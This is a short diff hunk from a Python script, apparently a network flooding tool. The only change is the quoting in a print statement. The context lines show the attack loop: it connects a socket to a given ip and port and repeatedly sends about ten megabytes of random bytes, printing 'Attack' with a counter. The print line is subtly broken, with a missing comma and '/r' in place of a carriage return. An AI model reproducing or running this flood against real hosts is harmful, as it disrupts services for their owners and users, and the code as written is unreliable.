@@ -11,5 +11,5 @@ s.connect((ip,port))
 
 for i in range (1, 1000*100000):
   s.send(random._urandom(100)*100000)
-  print(f'Attack {i}' end='/r')
+  print(f"Attack {i}" end="/r")
   time.sleep(sleep)
